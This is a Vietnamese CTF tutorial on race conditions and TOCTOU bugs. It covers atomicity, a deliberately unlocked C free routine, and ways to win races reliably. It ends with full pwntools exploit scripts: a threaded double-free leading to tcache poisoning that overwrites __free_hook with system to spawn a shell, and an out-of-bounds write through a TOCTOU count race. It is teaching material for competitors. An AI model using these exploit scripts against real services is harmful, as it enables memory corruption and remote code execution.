Race Condition

Hai luồng/tiến trình chạy chen nhau → thao tác không nguyên tử bị tách giữa chừng. Khe thời gian giữa kiểm tra và dùng (TOCTOU) cho attacker chèn thay đổi: vượt kiểm quyền, double-free, ghi đè file. Bài này: race thật với threading, cửa sổ đua, và cách thắng đua ổn định.

Bài này nói về cái gì?

Race condition: kết quả phụ thuộc thứ tự chạy của nhiều luồng. Khi thao tác lẽ ra phải nguyên tử (atomic) lại gồm nhiều bước, luồng khác chen vào giữa → trạng thái sai.

TOCTOU (Time-Of-Check to Time-Of-Use): chương trình kiểm điều kiện (vd "chưa free", "có quyền") rồi mới dùng — attacker đổi trạng thái trong khe đó.

Pwn: double-free (2 luồng free cùng chunk), vượt kiểm quyền, size đổi giữa kiểm và cấp phát → overflow. Thắng đua bằng lặp nhiều lần + đồng bộ.

Nếu chỉ nhớ một điều: Giữa "kiểm tra" và "dùng" có khe — chèn thay đổi vào khe đó.

⚡ COMBAT CARD — dán chạy khi đang thi
🔎 Nhận dạng 
pthread_create / fork + shared global
if (check) { ... use } // check & use KHÔNG khóa → TOCTOU
free trong 1 luồng, dùng lại trong luồng khác → double-free/UAF race
🧵 Race bằng threading (client) 
import threading
def hammer():
  while not done: p.sendline(b"use idx 0")   # spam
t=threading.Thread(target=hammer); t.start()
p.sendline(b"free idx 0")   # đua với hammer
🎯 Thắng đua ổn định

Lặp N lần (100–10000); giảm jitter: gửi 2 lệnh dồn 1 packet; dùng sched_yield/nhiều thread; mở rộng cửa sổ (sleep server, buffer lớn).

💥 Hệ quả

double-free → tcache poisoning. count/size đổi → overflow. auth bypass. symlink swap (TOCTOU file).

⚠️ Nhớ

Race xác suất — lặp nhiều. Local ≠ remote (độ trễ khác). Đo tỉ lệ thắng, tăng vòng lặp. Kiểm bằng nhiều lần chạy.

01 / NỀN TẢNG BẮT BUỘC

Nguyên tử vs. không nguyên tử

Một thao tác nguyên tử (atomic) chạy "trọn gói", không bị chen. Nhưng count-- thực ra là 3 lệnh máy: đọc count → trừ 1 → ghi lại. Nếu hai luồng cùng làm, cả hai đọc cùng giá trị cũ rồi ghi đè nhau → mất một lần trừ. Race condition là lỗi khi tính đúng đắn phụ thuộc thứ tự chen này. Pwn khai thác: ép hai luồng chen đúng lúc để tạo trạng thái bất hợp lệ (vd đếm số lần free sai → free 2 lần).

Định nghĩa nhanh

atomic

Chạy trọn gói, không chen được.

race condition

Kết quả phụ thuộc thứ tự luồng.

TOCTOU

Khe giữa kiểm tra và dùng.

cửa sổ đua

Khoảng thời gian chen được.

mutex/lock

Khóa để nối tiếp hóa (phòng thủ).

data race

2 luồng chạm 1 biến, ít nhất 1 ghi.

02 / VÌ SAO CÓ KỸ THUẬT

Thiếu khóa = cửa mở

Lập trình viên hay kiểm trước rồi làm sau: if (!obj->freed) { free(obj); obj->freed=1; }. Trông an toàn — nhưng nếu hai luồng cùng vào if khi freed==0, cả hai gọi free → double-free. Hoặc if (idx < count) rồi dùng arr[idx], nhưng luồng khác giảm count ở giữa → OOB. Không có mutex bọc cả kiểm-lẫn-dùng là có khe. Đề CTF race thường có menu đa luồng/socket mỗi kết nối một thread chia sẻ global, cố tình bỏ khóa.

03 / TOCTOU · MỤC LÕI

Khe giữa kiểm tra và dùng

Code có lỗi (C)

// menu đa luồng, KHÔNG khóa — mỗi request chạy 1 thread
void do_free(int i){
  if (slot[i] != NULL){        // ① KIỂM (time-of-check)
     free(slot[i]);              // ③ DÙNG (time-of-use) — khe ②→③
     slot[i] = NULL;
  }
}
// 2 thread gọi do_free(0) cùng lúc: cả hai qua ①, cùng free → DOUBLE-FREE
Tại sao thắngGiữa ① và ③ có vài trăm chu kỳ CPU. Hai thread spam do_free(0) hàng nghìn lần → sớm muộn trúng khe → cùng qua ①. Kết quả double-free → tcache poisoning.
04 / THẮNG ĐUA ỔN ĐỊNH

Race là xác suất — tăng tỉ lệ

1

Lặp nhiều lần

Mỗi lần đua xác suất nhỏ. Lặp 100–10000 lần cho đến khi trúng. Phát hiện trúng bằng crash/leak bất thường.

2

Mở rộng cửa sổ

Làm khe ②→③ dài hơn: gửi dữ liệu lớn (server bận copy), hoặc ép path chậm (file lớn, resize). Khe dài → dễ chen.

3

Đồng bộ điểm xuất phát

Hai thread cùng chờ một barrier rồi bắn đồng thời. Giảm jitter mạng: nối 2 lệnh vào 1 TCP packet (p.send(a+b)).

4

Nhiều thread/tiến trình

8–16 thread spam cùng lúc tăng khả năng chen. Hoặc dùng nhiều kết nối socket song song.

05 / TỰ TAY THỬ

Mô phỏng đua double-free

Bấm "Chạy đua" nhiều lần — thứ tự chen 2 luồng ngẫu nhiên. Khi cả hai qua kiểm trước khi free → double-free. Xem tỉ lệ thắng tăng khi bạn lặp.

T1
① if(!freed) ③ free
T2
① if(!freed) ③ free

07 / EXPLOIT ĐẦY ĐỦ

Double-free race → tcache (số thật)

# BẢN A — server đa luồng (glibc 2.31), do_free() không khóa.
# 2 thread spam free idx 0 → double-free → tcache poisoning → __free_hook.
from pwn import *
import threading
exe = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = remote("host", 1337)

def alloc(i,sz,data): p.sendline(f"alloc {i} {sz} {data}".encode())
def free(i):           p.sendline(f"free {i}".encode())

# 1) THẮNG ĐUA double-free: 2 thread free idx 0 cùng lúc, lặp đến khi trúng
alloc(0, 0x50, "A")
hit = {"ok": False}
def hammer():
    for _ in range(2000):
        if hit["ok"]: break
        free(0)
t = threading.Thread(target=hammer); t.start()
for _ in range(2000): free(0)       # main thread cũng spam
hit["ok"] = True; t.join()
# giờ tcache[0x60] có 2 lần cùng chunk (double-free) — kiểm bằng alloc lại

# 2) tcache poisoning: alloc lấy chunk, ghi fd = __free_hook, 2 lần alloc nữa
alloc(1, 0x50, p64(libc.sym.__free_hook))  # offset 0x1eee48 khi đã leak base
alloc(2, 0x50, "B")
alloc(3, 0x50, p64(libc.sym.system))   # chunk 3 ĐÈ lên __free_hook
alloc(4, 0x50, "/bin/sh\x00")
free(4)                                 # free → __free_hook(system)("/bin/sh")
p.interactive()
Thành thậtPhần đua là lặp 2000×2 thread — số lần tùy độ trễ, tăng nếu không trúng. Sau double-free, phần tcache poisoning là kỹ thuật tcache chuẩn (offset __free_hook=0x1eee48, system=0x52290 glibc 2.31; cần leak libc trước — qua UAF read). Đây là khung; đề thật thường cho sẵn leak.
# BẢN B — TOCTOU count: if(idx<count) rồi arr[idx], count giảm ở giữa.
from pwn import *
import threading
p = remote("host", 1337)
# thread A: liên tục "remove" (giảm count) ; thread B: "edit idx=count-1"
# khe: B kiểm idx<count PASS, A giảm count, B ghi arr[idx] giờ OOB
done = {"x": False}
def shrink():
    while not done["x"]: p.sendline(b"remove")
threading.Thread(target=shrink).start()
for _ in range(5000):
    p.sendline(b"edit 9 " + p64(0xdeadbeef))   # idx 9, race OOB write
done["x"] = True
p.interactive()
TOCTOUMẫu phổ biến thứ 2: kiểm biên bằng biến chung count rồi dùng, nhưng count bị luồng khác giảm giữa chừng → OOB write. Thắng đua giống hệt: spam 2 việc đối nghịch.
# BẢN C — pwnld + helper đua.
from pwnld import *
import threading
exe=ELF("./chall",checksec=False); libc=get_libc("./libc.so.6"); p=remote("host",1337)
# race_hammer: spam 1 lệnh trong thread tới khi cờ tắt
race_hammer(p, b"free 0", rounds=3000, threads=4)   # 4 thread đua
# rồi tcache poisoning như bản A
pwnldrace_hammer gom nhiều thread spam. Vẫn phải hiểu cửa sổ TOCTOU + hệ quả (double-free/OOB).
